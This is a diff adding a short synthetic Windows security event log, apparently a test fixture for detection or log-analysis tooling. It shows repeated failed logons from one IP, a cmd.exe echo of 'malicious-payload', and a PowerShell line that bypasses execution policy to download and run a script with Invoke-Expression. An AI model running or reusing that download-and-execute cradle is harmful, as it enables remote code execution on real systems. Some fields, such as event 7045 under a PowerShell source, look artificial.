@@ -1,0 +1,9 @@
+2026-06-24,18:10:01,4624,Microsoft-Windows-Security-Auditing,SYSTEM,WIN-DC01,An account was successfully logged on. Account Name: Administrator, IP Address: 192.168.1.50
+2026-06-24,18:10:10,4625,Microsoft-Windows-Security-Auditing,SYSTEM,WIN-DC01,An account failed to log on. Account Name: target_user, IP Address: 203.0.113.113
+2026-06-24,18:10:11,4625,Microsoft-Windows-Security-Auditing,SYSTEM,WIN-DC01,An account failed to log on. Account Name: target_user, IP Address: 203.0.113.113
+2026-06-24,18:10:12,4625,Microsoft-Windows-Security-Auditing,SYSTEM,WIN-DC01,An account failed to log on. Account Name: target_user, IP Address: 203.0.113.113
+2026-06-24,18:10:13,4625,Microsoft-Windows-Security-Auditing,SYSTEM,WIN-DC01,An account failed to log on. Account Name: target_user, IP Address: 203.0.113.113
+2026-06-24,18:10:14,4625,Microsoft-Windows-Security-Auditing,SYSTEM,WIN-DC01,An account failed to log on. Account Name: target_user, IP Address: 203.0.113.113
+2026-06-24,18:11:00,4688,Microsoft-Windows-Security-Auditing,SYSTEM,WIN-DC01,A new process has been created. Process Name: C:\Windows\System32\cmd.exe, CommandLine: cmd.exe /c "echo malicious-payload"
+2026-06-24,18:12:30,4624,Microsoft-Windows-Security-Auditing,SYSTEM,WIN-DC01,An account was successfully logged on. Account Name: backup_service, IP Address: 127.0.0.1
+2026-06-24,18:13:15,7045,PowerShell,Administrator,WIN-DC01,Creating Process: powershell.exe -ExecutionPolicy Bypass -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://shell.php')"
